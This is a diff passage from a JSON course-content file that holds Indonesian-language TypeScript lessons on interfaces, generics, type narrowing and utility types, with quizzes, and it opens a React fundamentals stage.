+          "Mendefinisikan bentuk objek data menggunakan interface dan type alias.",
+          "Memanfaatkan Union Types (`|`) dan Intersection Types (`&`).",
+          "Menerapkan pewarisan kontrak objek menggunakan kata kunci extends pada interface.",
+          "Menganalisis kapan harus memilih interface vs type alias dalam arsitektur proyek."
+        ],
+        "whyMatters": "`interface` dan `type` adalah alat pemodelan data utama yang digunakan untuk mendefinisikan Props komponen React dan skema API.",
+        "careerContext": "Konsistensi penggunaan interface/type adalah bagian penting dari standard code review di tim engineering.",
+        "commonMistakes": [
+          "Bingung memilih antara `type` dan `interface` (aturan praktis: gunakan `interface` untuk objek/props yang dapat di-extend, dan gunakan `type` untuk union/primitif/kompleks).",
+          "Lupa tanda tanya `?` pada properti opsional (contoh: `avatar?: string`)."
+        ],
+        "keyTerms": [
+          {
+            "term": "Interface",
+            "definition": "Deklarasi kontrak struktur bentuk objek yang mendukung pewarisan (extends) dan declaration merging."
+          },
+          {
+            "term": "Type Alias",
+            "definition": "Pemberian nama kustom untuk tipe data apapun (objek, union, primitif, fungsi)."
+          },
+          {
+            "term": "Union Type (|)",
+            "definition": "Tipe yang mengizinkan sebuah nilai untuk menjadi salah satu dari beberapa kemungkinan tipe."
+          },
+          {
+            "term": "Intersection Type (&)",
+            "definition": "Tipe yang menggabungkan beberapa definisi tipe menjadi satu kesatuan tipe baru."
+          }
+        ],
+        "contentMd": "# Type Aliases vs Interfaces (extends, union, intersection)\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari dua cara utama memodelkan data di TypeScript: **`interface`** dan **`type` (Type Alias)**, fitur pewarisan **`extends`**, serta operasi logika tipe: **Union (`|`)** dan **Intersection (`&`)**.\n\n## Mengapa Konsep Ini Penting?\nDalam membangun aplikasi web, Anda akan terus mendefinisikan bentuk data: seperti data Pengguna, Produk, atau Props Komponen React. Memahami perbedaan `interface` dan `type` membantu Anda menyusun arsitektur data yang fleksibel dan modular.\n\n## 1. Mendefinisikan Objek: `interface` vs `type`\n\n```typescript\n// Cara 1: Menggunakan Interface (Ideal untuk Entitas Objek)\ninterface UserInterface {\n  id: string;\n  nama: string;\n  email: string;\n  avatarUrl?: string; // Properti Opsional (Boleh Kosong)\n  readonly role: \"ADMIN\" | \"MEMBER\"; // Tidak boleh diubah setelah dibuat\n}\n\n// Cara 2: Menggunakan Type Alias (Fleksibel untuk Berbagai Bentuk)\ntype UserType = {\n  id: string;\n  nama: string;\n  email: string;\n};\n```\n\n## 2. Union Types (`|`) dan Intersection Types (`&`)\n\n### A. Union Types (`|` - Logika ATAU)\nNilai boleh berupa salah satu dari tipe yang ditentukan (Sangat populer untuk status state):\n```typescript\ntype StatusTransaksi = \"PENDING\" | \"PAID\" | \"EXPIRED\" | \"FAILED\";\ntype ID = string | number; // Boleh teks ataupun angka\n```\n\n### B. Intersection Types (`&` - Logika DAN / Penggabungan)\nMenggabungkan dua definisi objek menjadi satu kesatuan:\n```typescript\ntype Timestamps = {\n  createdAt: Date;\n  updatedAt: Date;\n};\n\ntype ProdukLengkap = {\n  id: number;\n  judul: string;\n  harga: number;\n} & Timestamps; // Menggabungkan properti produk + timestamps!\n```\n\n## 3. Pewarisan pada Interface (`extends`)\nInterface dapat mewarisi dan memperluas kontrak dari interface lain:\n\n```typescript\ninterface BaseEntity {\n  id: string;\n  createdAt: Date;\n}\n\n// Admin mewarisi id dan createdAt, lalu menambah permissions\ninterface AdminUser extends BaseEntity {\n  nama: string;\n  permissions: string[];\n}\n```\n\n## 4. Panduan Praktis: Kapan Pakai Interface vs Type?\n- **Gunakan `interface`**: Untuk mendefinisikan bentuk **Objek**, Model Data Database, atau **React Component Props** yang berpotensi di-extend.\n- **Gunakan `type`**: Untuk **Union Types** (`\"A\" | \"B\"`), **Primitif Aliases**, **Tuples**, atau manipulasi tipe tingkat lanjut (*Mapped Types*).\n\n## Kesalahan Umum Pemula\n- **Mencoba membuat Union dengan interface**: Sintaks `interface Status = \"A\" | \"B\"` adalah ilegal. Union hanya bisa dideklarasikan menggunakan `type`.\n\n## Praktik Mandiri\n1. Buat tipe union `type Tema = 'light' | 'dark' | 'system'`.\n2. Buat interface `ButtonProps` dengan properti `label: string` dan `variant: 'primary' | 'secondary'`.\n\n## Ringkasan\n- **`interface`** sangat kuat untuk pemodelan objek dan mendukung pewarisan **`extends`**.\n- **`type`** sangat fleksibel untuk mendefinisikan **Union (`|`)**, **Intersection (`&`)**, dan primitif.\n- Gunakan tanda tanya **`?`** untuk properti opsional dan **`readonly`** untuk properti yang tidak boleh diubah nilainya.",
+        "quizzes": [
+          {
+            "id": "q-11-3-1",
+            "question": "Manakah sintaks yang benar untuk membuat Union Type yang membatasi nilai variabel hanya boleh berupa salah satu dari 3 string status ('LOADING' | 'SUCCESS' | 'ERROR')?",
+            "options": [
+              "type Status = 'LOADING' | 'SUCCESS' | 'ERROR';",
+              "interface Status = 'LOADING' | 'SUCCESS' | 'ERROR';",
+              "enum Status { 'LOADING' | 'SUCCESS' | 'ERROR' }",
+              "const Status = union('LOADING', 'SUCCESS', 'ERROR');"
+            ],
+            "correctIndex": 0,
+            "explanation": "Union types dibuat menggunakan deklarasi Type Alias (type) dengan operator garis tegak (|)."
+          },
+          {
+            "id": "q-11-3-2",
+            "question": "Bagaimana cara sebuah interface mewarisi seluruh properti dari interface induk di TypeScript?",
+            "options": [
+              "Menggunakan kata kunci extends (contoh: interface AdminUser extends BaseUser { ... })",
+              "Menggunakan kata kunci implements",
+              "Menggunakan kata kunci inherits",
+              "Menggunakan tanda tambah (+)"
+            ],
+            "correctIndex": 0,
+            "explanation": "Kata kunci extends memungkinkan interface anak menyalin dan memperluas kontrak properti dari satu atau lebih interface induk."
+          },
+          {
+            "id": "q-11-3-3",
+            "question": "Apa arti dari tanda tanya (?) pada deklarasi properti interface berikut: avatarUrl?: string;?",
+            "options": [
+              "Properti tersebut bersifat opsional (optional property), nilainya boleh berisi string atau undefined/tidak diisi.",
+              "Properti tersebut bertipe rahasia dan tidak boleh dibaca.",
+              "Properti tersebut akan meminta input prompt dari pengguna.",
+              "Properti tersebut otomatis dienkripsi."
+            ],
+            "correctIndex": 0,
+            "explanation": "Tanda tanya ? menandai properti opsional yang boleh tidak disertakan saat instansiasi objek."
+          }
+        ]
+      },
+      {
+        "id": "lesson-11-4",
+        "stageId": "stage-11",
+        "slug": "generics-reusable-type-components",
+        "title": "Generics: Komponen Tipe Reusable (<T>)",
+        "titleEn": "TypeScript Generics (<T>)",
+        "level": "INTERMEDIATE",
+        "estimatedMinutes": 20,
+        "description": "Menciptakan komponen tipe fleksibel dan reusable dengan Type Parameters <T>, Generic Functions, Generic Interfaces, dan Generic Constraints (T extends ...).",
+        "prerequisites": [
+          "type-aliases-dan-interfaces"
+        ],
+        "learningObjectives": [
+          "Menjelaskan konsep Generics sebagai 'variabel untuk tipe data' (<T>).",
+          "Membuat fungsi generik yang mempertahankan keterikatan tipe input dan output secara akurat.",
+          "Menerapkan Generic Interface untuk standarisasi format API Response `{ data: T; status: number }`.",
+          "Membatasi tipe generik menggunakan Generic Constraints (`<T extends { id: string }>`)"
+        ],
+        "whyMatters": "Generics memungkinkan Anda menulis fungsi serbaguna yang bekerja dengan berbagai tipe data tanpa mengorbankan Type Safety.",
+        "careerContext": "API wrapper standar, hook `useState<T>`, dan ORM query database (Prisma) dibangun sepenuhnya di atas TypeScript Generics.",
+        "commonMistakes": [
+          "Menggunakan `any` alih-alih Generics (mengakibatkan informasi tipe data hilang saat data dikembalikan).",
+          "Membuat tipe generik yang terlalu rumit dan tidak terbaca."
+        ],
+        "keyTerms": [
+          {
+            "term": "Generics (<T>)",
+            "definition": "Fitur yang memungkinkan pembuatan komponen atau fungsi yang dapat bekerja dengan berbagai tipe data sambil mempertahankan type safety."
+          },
+          {
+            "term": "Type Parameter",
+            "definition": "Placeholder penampung tipe (seperti `T`, `U`, `K`) yang akan ditentukan saat fungsi/tipe dipanggil."
+          },
+          {
+            "term": "Generic Constraint",
+            "definition": "Batasan yang mewajibkan tipe generik harus memenuhi bentuk minimal tertentu (`extends`)."
+          }
+        ],
+        "contentMd": "# Generics: Komponen Tipe Reusable (<T>)\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari fitur paling fleksibel di TypeScript: **Generics (`<T>`)**. Anda akan memahami bagaimana membuat fungsi dan interface yang dapat digunakan kembali (*reusable*) untuk tipe data apa pun tanpa kehilangan keakuratan sistem pengetikan.\n\n## Mengapa Konsep Ini Penting?\nBayangkan Anda ingin membuat fungsi pembungkus respon API. Respon API Pengguna membawa data `User`, sedangkan respon API Produk membawa data `Product`. Apakah Anda harus membuat dua interface terpisah? Dengan Generics, Anda hanya perlu membuat **1 Generic Interface** yang fleksibel!\n\n## 1. Konsep Dasar Generics: \"Variabel untuk Tipe Data\"\nSama seperti fungsi biasa menerima argumen nilai, fungsi generik menerima **argumen tipe data** di dalam kurung siku `<T>`:\n\n```typescript\n// FUNGSI GENERIK SEDERHANA:\nfunction ambilElemenPertama<T>(daftar: T[]): T | undefined {\n  return daftar[0];\n}\n\n// 1. Digunakan untuk Array Angka (T otomatis menjadi number)\nconst angkaPertama = ambilElemenPertama([10, 20, 30]); // tipe: number\n\n// 2. Digunakan untuk Array String (T otomatis menjadi string)\nconst namaPertama = ambilElemenPertama([\"Acelino\", \"Budi\"]); // tipe: string\n```\n\n> Jika kita menggunakan `any`, hasil kembalian `angkaPertama` akan bertipe `any` (kehilangan proteksi). Dengan Generics, TypeScript **tahu persis tipe data aslinya**!\n\n## 2. Pola Standar Industri: Generic API Response\nIni adalah pola yang digunakan di hampir semua aplikasi web modern:\n\n```typescript\n// Interface Pembungkus Standar Seluruh Respon API Server\ninterface ApiResponse<TData> {\n  sukses: boolean;\n  pesan: string;\n  data: TData; // TData akan diisi sesuai kebutuhan pemanggil\n  kodeStatus: number;\n}\n\n// Definisi Model Spesifik:\ninterface UserProfile {\n  id: string;\n  nama: string;\n}\n\ninterface ProductItem {\n  id: number;\n  judul: string;\n  harga: number;\n}\n\n// REUSABLE & SANGAT BERSIH:\ntype UserResponse = ApiResponse<UserProfile>;\ntype ProductListResponse = ApiResponse<ProductItem[]>;\n```\n\n## 3. Membatasi Generics: Generic Constraints (`extends`)\nJika Anda ingin memastikan bahwa tipe generik `<T>` **wajib memiliki properti tertentu** (misal memiliki `id`):\n\n```typescript\n// Wajibkan T memiliki minimal properti id:\nfunction logIdElemen<T extends { id: string | number }>(item: T): void {\n  console.log(\"ID Elemen:\", item.id);\n}\n\nlogIdElemen({ id: \"user-101\", nama: \"Acelino\" }); // VALID\n// logIdElemen({ nama: \"Tanpa ID\" }); // ERROR: Property 'id' is missing!\n```\n\n## Kesalahan Umum Pemula\n- **Membuat generic saat tipe sudah pasti**: Jika sebuah fungsi hanya memproses string teks, cukup gunakan tipe `string` biasa, tidak perlu dipaksakan menjadi generik `<T>`.\n\n## Praktik Mandiri\n1. Buat Generic Interface `PaginationResult<T>` yang memiliki properti `items: T[]`, `totalPage: number`, dan `currentPage: number`.\n2. Gunakan untuk membungkus tipe `PaginationResult<string>`.\n\n## Ringkasan\n- **Generics (`<T>`)** memungkinkan pembuatan kode reusable dengan type safety yang utuh.\n- Menggantikan kebutuhan `any` yang merusak keamanan tipe.\n- Sangat ideal untuk standarisasi format **API Response** dan **State Wrapper**.\n- Gunakan **`<T extends Interface>`** untuk membatasi syarat bentuk tipe generik.",
+        "quizzes": [
+          {
+            "id": "q-11-4-1",
+            "question": "Apa fungsi utama dari fitur Generics (<T>) dalam bahasa pemrograman TypeScript?",
+            "options": [
+              "Membuat fungsi, interface, atau kelas yang fleksibel dan reusable untuk berbagai tipe data sambil tetap mempertahankan type safety dan informasi tipe asli tanpa menggunakan any.",
+              "Mengubah warna tema IDE secara otomatis.",
+              "Menghubungkan aplikasi ke server database PostgreSQL secara langsung.",
+              "Mempercepat waktu booting komputer."
+            ],
+            "correctIndex": 0,
+            "explanation": "Generics bertindak sebagai parameter tipe yang menangkap dan mempertahankan tipe data spesifik saat fungsi/interface dipanggil."
+          },
+          {
+            "id": "q-11-4-2",
+            "question": "Perhatikan interface berikut:\ninterface ApiResponse<T> {\n  status: number;\n  data: T;\n}\nBagaimana cara menggunakannya untuk membungkus data array string?",
+            "options": [
+              "ApiResponse<string[]>",
+              "ApiResponse(string[])",
+              "ApiResponse.string[]",
+              "ApiResponse<Array>"
+            ],
+            "correctIndex": 0,
+            "explanation": "Parameter tipe generik diisi di dalam kurung siku <...>, sehingga ApiResponse<string[]> menetapkan data bertipe string[]."
+          },
+          {
+            "id": "q-11-4-3",
+            "question": "Apa arti dari sintaks Generic Constraint: <T extends { id: string }>?",
+            "options": [
+              "Tipe T diizinkan bebas berupa tipe apa pun asalkan memiliki minimal properti id bertipe string.",
+              "Tipe T hanya boleh bernilai string murni.",
+              "Fungsi tersebut akan menghapus properti id.",
+              "Tipe T dilarang memiliki properti lain selain id."
+            ],
+            "correctIndex": 0,
+            "explanation": "Generic constraint dengan kata kunci extends membatasi tipe T agar wajib memenuhi kontrak struktural yang ditentukan."
+          }
+        ]
+      },
+      {
+        "id": "lesson-11-5",
+        "stageId": "stage-11",
+        "slug": "narrowing-type-guards-dan-discriminated-unions",
+        "title": "Type Narrowing, Type Guards & Discriminated Unions",
+        "titleEn": "Type Narrowing & Discriminated Unions",
+        "level": "INTERMEDIATE",
+        "estimatedMinutes": 20,
+        "description": "Mempersempit tipe data dengan typeof, instanceof, operator in, kustom User-Defined Type Guards (is), dan pola arsitektur Discriminated Unions (tagged unions).",
+        "prerequisites": [
+          "generics-reusable-type-components"
+        ],
+        "learningObjectives": [
+          "Menjelaskan konsep Type Narrowing: mempersempit tipe luas menjadi tipe spesifik di dalam blok logika.",
+          "Menerapkan Type Guards bawaan: typeof, instanceof, dan operator in.",
+          "Membangun Custom Type Guard menggunakan predikat tipe `val is Type`.",
+          "Menerapkan pola arsitektur Discriminated Unions (Tagged Unions) untuk pemodelan state mesin yang aman tanpa celah."
+        ],
+        "whyMatters": "Discriminated Unions adalah pola arsitektur paling elegan di TypeScript untuk memodelkan Async State (Loading vs Success vs Error) tanpa status yang membingungkan.",
+        "careerContext": "Arsitektur Redux, Zustand state actions, dan library schema Zod memanfaatkan Discriminated Unions secara menyeluruh.",
+        "commonMistakes": [
+          "Mencoba mengakses properti spesifik sebelum tipe di-narrowing (misal memanggil `res.error` saat statusnya adalah `SUCCESS`).",
+          "Lupa menyertakan literal diskriminator umum (seperti `type` atau `status`) pada setiap anggota union."
+        ],
+        "keyTerms": [
+          {
+            "term": "Type Narrowing",
+            "definition": "Proses mempersempit tipe yang lebih umum menjadi tipe yang lebih spesifik berdasarkan pemeriksaan runtime."
+          },
+          {
+            "term": "Type Guard",
+            "definition": "Ekspresi logika runtime yang menjamin tipe data bagi compiler TypeScript."
+          },
+          {
+            "term": "Discriminated Union",
+            "definition": "Pola penyatuan tipe objek yang memiliki satu properti pembeda literal umum yang unik (tag/discriminator)."
+          },
+          {
+            "term": "Type Predicate (is)",
+            "definition": "Sintaks kembalian fungsi `arg is Type` yang memberitahu compiler bahwa argumen tersebut adalah tipe tertentu jika fungsi return true."
+          }
+        ],
+        "contentMd": "# Type Narrowing, Type Guards & Discriminated Unions\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari teknik **Type Narrowing**: cara mempersempit tipe data menggunakan **Type Guards** bawaan (**`typeof`**, **`instanceof`**, **`in`**), membuat **Custom Type Guards (`is`)**, serta menguasai pola arsitektur legendaris: **Discriminated Unions**.\n\n## Mengapa Konsep Ini Penting?\nJika sebuah variabel memiliki tipe union `string | number`, Anda tidak bisa langsung memanggil `.toUpperCase()` karena ada kemungkinan variabel tersebut adalah angka. Anda harus \"menyempitkan\" tipenya terlebih dahulu melalui pemeriksaan logika yang aman.\n\n## 1. Tiga Type Guards Bawaan\n\n```typescript\nfunction prosesInput(nilai: string | number | Date) {\n  // 1. typeof Guard (Untuk Primitif)\n  if (typeof nilai === \"string\") {\n    console.log(nilai.toUpperCase()); // Di sini TypeScript TAHU nilai adalah string!\n  } \n  // 2. instanceof Guard (Untuk Class / Objek Instansiasi)\n  else if (nilai instanceof Date) {\n    console.log(nilai.getFullYear()); // Di sini nilai pasti Date!\n  } \n  // Sisanya pasti number!\n  else {\n    console.log(nilai.toFixed(2));\n  }\n}\n```\n\n## 2. Operator `in` Guard (Memeriksa Properti Objek)\n\n```typescript\ntype Admin = { nama: string; izinHapus: boolean };\ntype Pengunjung = { nama: string; sisaKredit: number };\n\nfunction prosesUser(user: Admin | Pengunjung) {\n  // Periksa apakah properti 'izinHapus' ada di dalam objek user:\n  if (\"izinHapus\" in user) {\n    console.log(\"Admin terdeteksi, hak akses:\", user.izinHapus);\n  } else {\n    console.log(\"Pengunjung terdeteksi, saldo:\", user.sisaKredit);\n  }\n}\n```\n\n## 3. Pola Emas Industri: Discriminated Unions (Tagged Unions)\nIni adalah teknik terbaik untuk memodelkan Async Request State di React:\n\n```typescript\n// Definisikan setiap kemungkinan keadaan dengan sebuah 'tag' pembeda unik (status):\ntype AsyncState = \n  | { status: \"IDLE\" }\n  | { status: \"LOADING\" }\n  | { status: \"SUCCESS\"; data: string[]; waktu: Date }\n  | { status: \"ERROR\"; pesanError: string };\n\nfunction renderUI(state: AsyncState) {\n  switch (state.status) {\n    case \"IDLE\":\n      return \"Silakan klik tombol muat\";\n    case \"LOADING\":\n      return \"Sedang memuat data...\";\n    case \"SUCCESS\":\n      // TypeScript OTOMATIS tahu bahwa state.data dan state.waktu PASTI ADA di blok ini!\n      return `Data Berhasil: ${state.data.join(\", \")}`;\n    case \"ERROR\":\n      // TypeScript OTOMATIS tahu state.pesanError HANYA ada di sini!\n      return `Gagal: ${state.pesanError}`;\n  }\n}\n```\n\n> **Keunggulan Mutlak**: Tidak akan pernah ada kondisi bug mustahil seperti `isLoading === true` tetapi `data` sudah ada, atau `pesanError` muncul padahal statusnya `SUCCESS`.\n\n## Kesalahan Umum Pemula\n- **Membuat boolean terpisah untuk state yang mutually exclusive**: Menulis `{ isLoading: boolean, isError: boolean, isSuccess: boolean }` yang dapat memicu status bertabrakan. Selalu gunakan Discriminated Union!\n\n## Praktik Mandiri\n1. Buat Discriminated Union untuk transaksi: `{ tipe: 'TUNAI', jumlah: number }` dan `{ tipe: 'TRANSFER', nomorRekening: string, jumlah: number }`.\n2. Buat fungsi pemroses menggunakan `switch (trx.tipe)`.\n\n## Ringkasan\n- **Type Narrowing** mempersempit tipe union melalui pemeriksaan logika (*guards*).\n- Gunakan **`typeof`** untuk primitif, **`instanceof`** untuk class, dan **`in`** untuk memeriksa properti objek.\n- **Discriminated Unions** menggabungkan tipe dengan satu properti literal tag umum (`status` atau `type`), menghasilkan arsitektur state yang 100% bebas dari impossible state bugs.",
+        "quizzes": [
+          {
+            "id": "q-11-5-1",
+            "question": "Apa yang dimaksud dengan proses 'Type Narrowing' dalam TypeScript?",
+            "options": [
+              "Proses mempersempit tipe data yang luas (seperti string | number) menjadi tipe data yang lebih spesifik di dalam blok logika tertentu menggunakan pemeriksaan runtime (Type Guards).",
+              "Proses mengecilkan ukuran file font CSS.",
+              "Menghapus tipe data yang tidak digunakan dari komputer.",
+              "Mengubah tipe number menjadi string."
+            ],
+            "correctIndex": 0,
+            "explanation": "Type narrowing memanfaatkan alur kontrol logika (if, switch) untuk memverifikasi tipe spesifik sehingga method uniknya aman dipanggil."
+          },
+          {
+            "id": "q-11-5-2",
+            "question": "Apa keunggulan arsitektur 'Discriminated Unions' dalam memodelkan status state di aplikasi web?",
+            "options": [
+              "Mencegah 'Impossible States' (status mustahil yang bertentangan) dan memungkinkan TypeScript mengenali properti payload yang sah secara otomatis berdasarkan properti pembeda literal (seperti status / type).",
+              "Mengurangi kecepatan compile TypeScript.",
+              "Membuat database SQL otomatis terinstal.",
+              "Menolak penggunaan format JSON."
+            ],
+            "correctIndex": 0,
+            "explanation": "Discriminated unions mengaitkan payload data secara ketat dengan status literalnya, menghilangkan bug di mana error dan data muncul bersamaan secara janggal."
+          },
+          {
+            "id": "q-11-5-3",
+            "question": "Type Guard operator manakah yang digunakan untuk memeriksa apakah sebuah properti spesifik eksis di dalam sebuah objek referensi?",
+            "options": [
+              "Operator in (contoh: if ('pesanError' in state))",
+              "Operator typeof",
+              "Operator exists",
+              "Operator hasProperty"
+            ],
+            "correctIndex": 0,
+            "explanation": "Operator in mengecek keberadaan properti pada objek dan sekaligus berfungsi sebagai Type Guard di mata compiler TypeScript."
+          }
+        ]
+      },
+      {
+        "id": "lesson-11-6",
+        "stageId": "stage-11",
+        "slug": "utility-types-dan-advanced-types",
+        "title": "Utility Types & Advanced Types (Partial, Pick, Omit, Record)",
+        "titleEn": "TypeScript Utility Types",
+        "level": "ADVANCED",
+        "estimatedMinutes": 20,
+        "description": "Mentransformasikan tipe data yang ada dengan Utility Types bawaan: Partial, Required, Readonly, Pick, Omit, Record<K, V>, ReturnType, dan keyof.",
+        "prerequisites": [
+          "narrowing-type-guards-dan-discriminated-unions"
+        ],
+        "learningObjectives": [
+          "Menerapkan Partial<T> untuk operasi update/patch di mana seluruh field menjadi opsional.",
+          "Menerapkan Pick<T, K> dan Omit<T, K> untuk mengekstrak atau membuang field tertentu dari tipe yang ada.",
+          "Menerapkan Record<Keys, Type> untuk memetakan kamus dictionary objek yang aman.",
+          "Menggunakan operator keyof untuk mengekstrak union string dari seluruh nama properti tipe."
+        ],
+        "whyMatters": "Utility Types menerapkan prinsip DRY (*Don't Repeat Yourself*) pada sistem tipe, mencegah Anda menulis ulang interface yang sama berulang kali.",
+        "careerContext": "Pola update database (Prisma update payload) dan form PATCH API di Next.js menggunakan `Partial<T>` dan `Omit<T, 'id'>`.",
+        "commonMistakes": [
+          "Menduplikasi interface secara manual hanya untuk menghapus satu field `id` (seharusnya gunakan `Omit<User, 'id'>`).",
+          "Salah urutan parameter pada `Record<Keys, Value>`."
+        ],
+        "keyTerms": [
+          {
+            "term": "Utility Types",
+            "definition": "Tipe bawaan global TypeScript untuk mentransformasikan dan memanipulasi bentuk tipe data yang sudah ada."
+          },
+          {
+            "term": "Partial<T>",
+            "definition": "Mengubah seluruh properti tipe T menjadi opsional (optional `?`)."
+          },
+          {
+            "term": "Omit<T, K>",
+            "definition": "Membuat tipe baru dengan menyalin seluruh properti T KECUALI kunci K yang dibuang."
+          },
+          {
+            "term": "Pick<T, K>",
+            "definition": "Membuat tipe baru HANYA dari kunci K terpilih yang diambil dari T."
+          },
+          {
+            "term": "Record<K, V>",
+            "definition": "Mendefinisikan tipe objek kamus (dictionary/map) dengan pasangan kunci K dan nilai V."
+          }
+        ],
+        "contentMd": "# Utility Types & Advanced Types (Partial, Pick, Omit, Record)\n\n## Apa yang Akan Dipelajari?\nPada materi tingkat lanjut ini, Anda akan mempelajari **Utility Types**: alat bawaan TypeScript untuk mentransformasikan bentuk tipe yang sudah ada (**`Partial`**, **`Pick`**, **`Omit`**, **`Record`**, **`Readonly`**) serta operator **`keyof`**.\n\n## Mengapa Konsep Ini Penting?\nBayangkan Anda memiliki interface `User` dengan 10 properti. Saat membuat fitur *Update Profile (PATCH)*, semua properti tersebut menjadi opsional karena pengguna mungkin hanya ingin mengganti nama saja. Apakah Anda harus menulis ulang interface baru? Tidak! Anda cukup menggunakan **`Partial<User>`**.\n\n## 1. Model Basis: Interface Pengguna\n\n```typescript\ninterface User {\n  id: string;\n  nama: string;\n  email: string;\n  passwordHash: string;\n  role: \"ADMIN\" | \"MEMBER\";\n  createdAt: Date;\n}\n```\n\n## 2. Empat Utility Types yang Paling Sering Digunakan\n\n### A. `Partial<T>` (Semua Menjadi Opsional `?`)\nSangat sempurna untuk fungsi pembaruan profil / PATCH request:\n```typescript\n// Semua properti User berubah otomatis memiliki tanda tanya ?\ntype UpdateUserDto = Partial<User>;\n\nfunction updateUser(id: string, dataUpdate: UpdateUserDto) {\n  // dataUpdate boleh hanya berisi { nama: \"Acelino Baru\" }\n}\n```\n\n### B. `Omit<T, Keys>` (Salin Semua KECUALI Kunci Tertentu)\nSangat sempurna untuk form pendaftaran yang belum memiliki `id` atau `createdAt`:\n```typescript\n// Buang properti 'id' dan 'createdAt' karena dibuat otomatis oleh database:\ntype RegisterUserDto = Omit<User, \"id\" | \"createdAt\">;\n```\n\n### C. `Pick<T, Keys>` (Ambil HANYA Kunci Terpilih)\nSangat sempurna untuk kartu profil ringkas (*User Card*):\n```typescript\n// Ambil HANYA 'nama' dan 'role':\ntype UserCardPreview = Pick<User, \"nama\" | \"role\">;\n```\n\n### D. `Record<Keys, Value>` (Objek Kamus / Dictionary)\nMendefinisikan kamus data berpasangan:\n```typescript\n// Format: Record<TipeKunci, TipeNilai>\ntype HakAksesRole = Record<\"ADMIN\" | \"MEMBER\" | \"GUEST\", string[]>;\n\nconst daftarIzin: HakAksesRole = {\n  ADMIN: [\"create\", \"read\", \"update\", \"delete\"],\n  MEMBER: [\"read\", \"create\"],\n  GUEST: [\"read\"]\n};\n```\n\n## 3. Operator `keyof` (Ekstraksi Nama Kunci)\n`keyof` mengambil seluruh nama properti dari sebuah interface menjadi tipe Union String:\n\n```typescript\ntype UserKeys = keyof User; \n// Hasilnya setara dengan: \"id\" | \"nama\" | \"email\" | \"passwordHash\" | \"role\" | \"createdAt\"\n```\n\n## Kesalahan Umum Pemula\n- **Menduplikasi definisi tipe berulang kali**: Menulis 3 interface yang mirip secara manual. Terapkan prinsip DRY (*Don't Repeat Yourself*) dengan memanfaatkan Utility Types.\n\n## Praktik Mandiri\n1. Buat interface `Produk` (id, nama, harga, stok, deskripsi).\n2. Buat tipe `TambahProdukDto` menggunakan `Omit<Produk, 'id'>`.\n3. Buat tipe `EditProdukDto` menggunakan `Partial<Omit<Produk, 'id'>>`.\n\n## Ringkasan\n- **`Partial<T>`** membuat seluruh field menjadi opsional (cocok untuk PATCH update).\n- **`Omit<T, K>`** membuang field tertentu (cocok untuk form input tanpa ID).\n- **`Pick<T, K>`** mengekstrak field terpilih saja.\n- **`Record<K, V>`** mendefinisikan kamus kunci-nilai yang terstruktur rapi.\n- **`keyof T`** menghasilkan union dari seluruh nama properti tipe.",
+        "quizzes": [
+          {
+            "id": "q-11-6-1",
+            "question": "Utility type bawaan TypeScript manakah yang paling ideal digunakan untuk fungsi pembaruan profil (PATCH) di mana seluruh properti objek aslinya diubah menjadi bersifat opsional (?)?",
+            "options": [
+              "Partial<T>",
+              "Required<T>",
+              "Readonly<T>",
+              "Omit<T, K>"
+            ],
+            "correctIndex": 0,
+            "explanation": "Partial<T> secara otomatis mengubah seluruh properti tipe T menjadi opsional (dengan penambahan modifier ?)."
+          },
+          {
+            "id": "q-11-6-2",
+            "question": "Jika Anda memiliki interface User dengan field { id, name, email, password }, bagaimana cara membuat tipe baru yang menyalin seluruh field tersebut KECUALI field 'password'?",
+            "options": [
+              "Omit<User, 'password'>",
+              "Pick<User, 'password'>",
+              "Exclude<User, 'password'>",
+              "Remove<User, 'password'>"
+            ],
+            "correctIndex": 0,
+            "explanation": "Omit<T, K> membangun tipe baru dengan mengambil seluruh properti T dan membuang kunci K yang ditentukan."
+          },
+          {
+            "id": "q-11-6-3",
+            "question": "Apa fungsi dari utility type Record<K, V> di TypeScript?",
+            "options": [
+              "Mendefinisikan tipe objek kamus (dictionary/map) dengan kumpulan tipe kunci K dan tipe nilai V yang terikat secara type-safe.",
+              "Merekam suara pengguna saat menggunakan aplikasi web.",
+              "Menyimpan histori perubahan kode ke database.",
+              "Menghapus seluruh file rekaman log."
+            ],
+            "correctIndex": 0,
+            "explanation": "Record<Keys, Value> adalah utility type standar untuk memetakan objek dictionary dengan kunci dan nilai bertipe spesifik."
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "id": "stage-12",
+    "orderIndex": 12,
+    "titleId": "React Fundamentals: Components, JSX & Props",
+    "titleEn": "React Fundamentals: Components, JSX & Props",
+    "category": "Frontend",
+    "description": "Memahami paradigma Declarative UI, Component-Driven Architecture, JSX/TSX syntax rules, Props passing, Children prop, Conditional Rendering, dan List Keys.",
+    "descriptionEn": "Master declarative UI, component architecture, JSX/TSX rules, props, children, conditional rendering, and list keys in React.",
+    "lessons": [
+      {
+        "id": "lesson-12-1",
+        "stageId": "stage-12",
+        "slug": "arsitektur-komponen-dan-declarative-ui",
+        "title": "Arsitektur Komponen & Paradigma Declarative UI",
+        "titleEn": "Component Architecture & Declarative UI",
+        "level": "BEGINNER",
+        "estimatedMinutes": 15,
+        "description": "Memahami pergeseran paradigma dari Imperative DOM manipulation ke Declarative UI (UI = f(state)), struktur Virtual DOM, dan Component-Driven Architecture.",
+        "prerequisites": [
+          "utility-types-dan-advanced-types"
+        ],
+        "learningObjectives": [
+          "Membedakan paradigma Imperative (memberitahu langkah per langkah) vs Declarative (mendeskripsikan hasil akhir UI).",
+          "Menjelaskan formula inti React: UI = f(state).",
+          "Memahami peran Virtual DOM dan proses Rekonsiliasi (Reconciliation / Diffing algorithm)."
+        ],
+        "whyMatters": "Declarative UI membebaskan developer dari pekerjaan melelahkan memanipulasi DOM secara manual yang rawan bug sinkronisasi data.",
+        "careerContext": "Seluruh frontend modern (React, Next.js, Vue, Svelte, Flutter) mengadopsi paradigma Declarative Component-Driven.",
+        "commonMistakes": [
+          "Mencoba menggunakan `document.querySelector` atau `innerHTML` di dalam komponen React alih-alih memanfaatkan state dan props deklaratif."
+        ],
+        "keyTerms": [
+          {
+            "term": "Declarative UI",
+            "definition": "Pendekatan pemrograman di mana developer mendeskripsikan 'seperti apa tampilan UI seharusnya' berdasarkan state saat ini."
+          },
+          {
+            "term": "Component",
